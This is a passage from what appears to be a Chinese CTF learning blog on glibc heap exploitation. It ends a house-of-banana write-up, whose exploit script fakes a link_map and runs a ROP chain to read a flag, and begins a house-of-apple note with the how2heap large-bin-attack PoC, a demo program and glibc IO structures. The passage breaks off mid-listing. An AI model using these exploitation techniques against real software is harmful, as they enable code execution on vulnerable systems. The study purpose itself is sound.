class="line">pop_rdi=libc_base+<span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi=libc_base+<span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12=libc_base+<span class="number">0x000000000011c1e1</span></span><br><span class="line">write_addr=libc_base+libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr=libc_base+libc.symbols[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_addr=libc.symbols[<span class="string">&#x27;read&#x27;</span>]+libc_base</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc_base+<span class="number">0x3ec090</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x290</span>)+p64(rtld_global-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">link_map=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(libc_base+<span class="number">0x223740</span>)<span class="comment">#l_next</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)</span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)<span class="comment">#l_real</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">28</span> </span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">32</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[26]-&gt;d_un.d_ptr    </span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xc08</span>+<span class="number">0x10</span>+<span class="number">0x98</span>+<span class="number">0x40</span>)<span class="comment">#l-&gt;l_info[28]</span></span><br><span class="line">link_map+=p64(<span class="number">0x20</span>)<span class="comment">#//i=l-&gt;l_info[28]-&gt;d_un.d_val</span></span><br><span class="line">link_map+=<span class="string">b&quot;flag\x00\x00\x00\x00&quot;</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xb90</span>+<span class="number">0x40</span>)</span><br><span class="line">link_map+=p64(setcontext)</span><br><span class="line">link_map+=p64(ret_addr)</span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)<span class="comment">#rdi</span></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsi</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">link_map+=p64(<span class="number">0x100</span>)<span class="comment">#rdx</span></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">link_map+=p64(heap_base+<span class="number">0xdc8</span>)<span class="comment">#rsp</span></span><br><span class="line">link_map+=p64(read_addr)<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">link_map+=p64(<span class="number">0</span>)*<span class="number">36</span></span><br><span class="line">link_map+=p64(<span class="number">0x800000000</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_d,d_a,d_e,d_s)</span><br><span class="line">edit(<span class="number">2</span>,link_map)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Your choice:\n&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">flag_addr=heap_base+<span class="number">0xd00</span></span><br><span class="line">orw=p64(pop_rdi)+p64(flag_addr)</span><br><span class="line">orw+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">orw+=p64(pop_rsi)+p64(heap_base)</span><br><span class="line">orw+=p64(pop_rdx_r12)+p64(<span class="number">0x50</span>)+p64(<span class="number">0</span>)</span><br><span class="line">orw+=p64(write_addr)</span><br><span class="line">p.sendline(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302172127529.png" alt="image-20230217205622280"></p><h2 id="总结：">总结：</h2><p><code>house of banana</code> 是 <code>ha1vk</code> 师傅提出来的一种利用手法，与<code>house</code> 系列的大部分攻击 <code>IO_FILE</code> 的利用不同，<code>house of banana</code> 是攻击的 <code>rtld_global</code> 结构体，伪造 <code>link_map</code> 进行的劫持执行流，只需要进行一次 <code>large bin attack</code> 并且能调用 <code>exit</code> 函数即可触发攻击，不过在攻击远程的时候可能需要爆破 （ <code>ld</code> 和 <code>libc</code> 的偏移可能在本地和远程不固定）</p><h2 id="参考文章">参考文章</h2><p>[<a href="https://bbs.kanxue.com/thread-272098.htm#msg_header_h3_31">原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p><p><a href="https://www.buaq.net/go-85397.html">高Glibc版本下的堆骚操作解析 (buaq.net)</a></p><p><a href="https://www.anquanke.com/post/id/222948#h3-5">house of banana-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> large bin attack </tag>
            
            <tag> house of banana </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of apple的学习总结</title>
      <link href="/posts/19609dd.html"/>
      <url>/posts/19609dd.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言：">前言：</h3><p><code>house of apple</code> 是 <a href="https://roderickchan.github.io/">roderick</a> 师傅提出的一种非常优秀的 <code>IO</code> 攻击利用方法，应该在刚刚学习关于堆的漏洞时便看到 <strong>roderick</strong> 师傅提出的这种利用方法，当时看着文章上出现的很多不认识的名词感慨自己所了解的太少，时隔近七个月现在终于学习到了 <code>house of apple</code> 。而这篇文章仅仅是记录自己关于 <code>house of apple</code> 的学习总结，如果真正要进行对 <code>house of apple</code> 的学习还是建议去看 <strong>roderick</strong> 师傅发表的三篇文章。</p><p><strong>本文所有的 <code>glibc</code> 源代码均来自 <code>2.31</code> 版本</strong></p><h3 id="large-bin-attack：">large bin attack：</h3><p><code>house of apple</code> 的攻击前提通常是使用 <code>large bin attack</code> ，因此需要先介绍一下 <code>glibc</code> 高版本中的 <code>large bin attack</code>。 <code>glibc</code> 低版本的 <code>large bin attack</code> 可以向任意两个地址写入两个堆地址，而高版本的 <code>large bin attack</code> 攻击效果是可以向任意一个地址写入一个堆地址。</p><p>漏洞源码如下：</p><p>下面代码位于 <code>ptmalloc</code> 遍历 <code>unsorted bin</code> 寻求合适堆块时将堆块分类，使堆块链入 <code>large bin </code> 过程的代码片段</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="漏洞原理：">漏洞原理：</h5><p>这部分代码存在的问题在于 <code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</code> <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 这两行代码中， <code>victim</code> 是将要被链入进 <code>large bin</code> 的堆块，而 <code>fwd</code> 是比 <code>victim</code> 大且位于同一个 <code>large bin</code> 的堆块，如果我们可以控制  <code>fwd-&gt;bk_nextsize</code> 为 <code>target_addr</code>（通过堆溢出或者 <code>UAF</code>），这样在 <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</code> 执行时，就相当于是向 <code>target+0x20</code> 的位置写入 <code>victim</code>。因为 C语言 里访问结构体的成员本质上是通过偏移进行访问的，所以 <code>-&gt;fd_nextsize</code> 相当于 <code>+0x20</code>。</p><h5 id="利用过程：">利用过程：</h5><ol><li><p>申请一个 <code>堆块A</code>，将其释放掉进入 <code>unsorted bin</code> ，再申请一个比 <code>堆块A</code> 大的 <code>堆块U</code> ,此时 <code>堆块A</code> 进入 <code>large bin</code></p></li><li><p>申请一个 <code>堆块B</code> ，将其释放进入 <code>unsorted bin</code> 。 <code>堆块B</code> 需要比 <code>堆块A</code> 小且二者需要位于同一个 <code>large bin</code> 中。</p></li><li><p>利用 <code>堆溢出</code> 或者 <code>UAF</code> 等方式来篡改 <code>堆块A</code> 的 <code>bk_nextsize</code> 为 <code>target_addr-0x20</code></p></li><li><p>最后释放一个跟 <code>堆块A</code> 和 <code>堆块B</code> 位于同一个 <code>large bin</code> 且比 <code>堆块A</code> 和 <code>堆块B</code> 都大的 <code>堆块C</code></p></li><li><p>此时触发 <code>large bin attack</code> ，攻击效果是向 <code>target_addr</code> 中写入 <code>堆块B</code> 的地址</p><p>举个例子，上述 <code>堆块A</code> <code>堆块B</code> <code>堆块C</code> <code>堆块U</code> 的大小可以分别为 <code>0x428</code> <code>0x418</code> <code>0x438</code> <code>0x438</code></p></li></ol><p><code>poc</code>如下，该 <code>poc</code> 来自 <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.31/large_bin_attack.c">how2heap</a></p><p>然后我把前面一部分翻译成了中文</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">A revisit to large bin attack for after glibc2.30</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Relevant code snippet :</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if ((unsigned long) (size) &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))&#123;</span></span><br><span class="line"><span class="comment">fwd = bck;</span></span><br><span class="line"><span class="comment">bck = bck-&gt;bk;</span></span><br><span class="line"><span class="comment">victim-&gt;fd_nextsize = fwd-&gt;fd;</span></span><br><span class="line"><span class="comment">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">  <span class="comment">/*Disable IO buffering to prevent stream from interfering with heap*/</span></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;自glibc2.30以来，对大型bin块插入实施了两项新检查\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;检查 1 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (nextsize)\&quot;);\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Check 2 : \n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;    if (bck-&gt;fd != fwd)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;        malloc_printerr (\&quot;malloc(): largebin double linked list corrupted (bk)\&quot;);\n\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;这防止了传统的large bin attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;然而，仍有一条可能的路径触发large bin attack。PoC如下所示： \n\n&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;以下是我们要覆盖的目标 (%p) : %lu\n\n&quot;</span>,&amp;target,target);</span><br><span class="line">  <span class="type">size_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;首先，我们分配一个大的块[p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;另一个堆块防止合并\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;我们还分配了第二个堆块 [p2]  (%p).\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;此堆块应小于[p1]，并属于同一个large bin.\n&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *g2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;再次分配保护块以防止合并\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;释放两个--&gt;[p1]中较大的一个 --&gt; [p1] (%p)\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="type">size_t</span> *g3 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;分配大于[p1]的块以将[p1]插入large bin\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(p2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;释放两个--&gt;[p2]中较小的一个 (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;此时, we have one chunk in large bin [p1] (%p),\n&quot;</span>,p1<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;               and one chunk in unsorted bin [p2] (%p)\n&quot;</span>,p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  p1[<span class="number">3</span>] = (<span class="type">size_t</span>)((&amp;target)<span class="number">-4</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now modify the p1-&gt;bk_nextsize to [target-0x20] (%p)\n&quot;</span>,(&amp;target)<span class="number">-4</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> *g4 = <span class="built_in">malloc</span>(<span class="number">0x438</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Finally, allocate another chunk larger than [p2] (%p) to place [p2] (%p) into large bin\n&quot;</span>, p2<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;  the modified p1-&gt;bk_nextsize does not trigger any error\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Upon inserting [p2] (%p) into largebin, [p1](%p)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (%p)\n&quot;</span>, p2<span class="number">-2</span>, p1<span class="number">-2</span>, p2<span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;In out case here, target is now overwritten to address of [p2] (%p), [target] (%p)\n&quot;</span>, p2<span class="number">-2</span>, (<span class="type">void</span> *)target);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Target (%p) : %p\n&quot;</span>,&amp;target,(<span class="type">size_t</span>*)target);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;====================================================================\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  assert((<span class="type">size_t</span>)(p2<span class="number">-2</span>) == target);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加载源码调试上面的 <code>poc</code> ，基本调试两遍就明白利用过程了。</p><h5 id="补充：">补充：</h5><p>上述 <code>large bin attack</code> 的利用是最初在查找网上资料自学的时候看见的做法，但事实上有一个更简单的方法只需要两次进入 <code>large bin</code> 即可（上面的做法是一共用了三次进入 <code>large bin</code> 的堆块）。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">      <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">          size |= PREV_INUSE;</span><br><span class="line">          <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">          assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">          <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size)</span><br><span class="line">&lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">            &#123;</span><br><span class="line">              fwd = bck;</span><br><span class="line">              bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">              victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">              victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">              fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">          ...</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p><code>victim-&gt;fd_nextsize = fwd-&gt;fd;</code> 此处的 <code>fwd-&gt;fd</code> 指向的是唯一存在 <code>large bin</code> 中的堆块，漏洞在下面两行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure><p>依然是控制 <code>bk_nextsize</code> ，然后向 <code>bk_nextsize-0x20</code> 的位置写一个堆地址 <code>victim</code> 和上面利用一样，举个例子，可以先申请一个 <code>0x428</code> 的堆块进入 <code>large bin</code>，然后去篡改其 <code>bk_nextsize</code> ，再让一个 <code>0x418</code> 的堆块进入 <code>large bin</code> 即可触发 <code>large bin attack</code></p><p><code>demo</code> 如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//Ubuntu GLIBC 2.35-0ubuntu3.1 </span></span><br><span class="line"><span class="comment">//gcc demo.c -o demo -g -w</span></span><br><span class="line"><span class="type">char</span> data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data address -------&gt; %p\n&quot;</span>,&amp;data);<span class="comment">//最终被写入数据的全局变量地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value   -------&gt; %s\n&quot;</span>,data);<span class="comment">//此时全局的内容为空 </span></span><br><span class="line">    </span><br><span class="line"><span class="type">void</span> *libc_base=&amp;<span class="built_in">printf</span><span class="number">-0x60770</span>;<span class="comment">//获取libc基地址 </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc base address ------&gt; %p\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *p=<span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="type">char</span> *p1=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;p chunk address--------&gt; %p\n&quot;</span>,p);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)(p+<span class="number">0x18</span>)=(<span class="type">long</span> <span class="type">long</span> <span class="type">int</span>)&amp;data<span class="number">-0x20</span>;</span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data value -------&gt; %s\n&quot;</span>,data);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202302011939896.png" alt="image-20230201193929700"></p><h3 id="house-of-apple：">house of apple：</h3><p><strong>roderick</strong> 师傅发表了关于该手法的三篇文章，我这里的学习总结只记录前两篇文章。</p><h4 id="house-of-apple1">house of apple1</h4><h5 id="利用条件：">利用条件：</h5><ol><li>可以泄露 <code>libc</code> 地址和堆地址</li><li>可以使用任意地址写一个堆地址（通常是使用 <code>large bin attack</code> ）</li><li>从 <code>main</code> 函数返回或者调用 <code>exit</code> 函数</li></ol><h5 id="攻击效果：">攻击效果：</h5><p>任意地址写一个堆地址（也可以是任意地址写一个其他地址，这个其他地址取决于伪造的 <code>IO_FILE</code>在哪里，通常是在堆上，所以是任意地址写一个堆地址）</p><h5 id="适用版本：">适用版本：</h5><p>目前的所有 <code>libc</code> 版本，从 <code>2.23</code> 到目前最新的 <code>2.36</code></p><h5 id="前置知识：">前置知识：</h5><p>在 <code>IO_FILE</code> 中有一个成员变量 <code>_wide_data</code> ，该成员变量为一个结构体指针（如下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span> </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该 <code>_IO_wide_data</code> 结构体定义如下,它是宽字节流的数据结构，用于处理宽字符的输入输出。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_base;<span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_backup_base;<span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">   backup area */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_save_end;<span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而在这个结构体中有一个 <code>_wide_vtable</code> ，里面存放的也都是函数指针 （如下）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wstrn_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_wstr_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstrn_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wdefault_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wstr_seekoff),</span><br><span class="line">  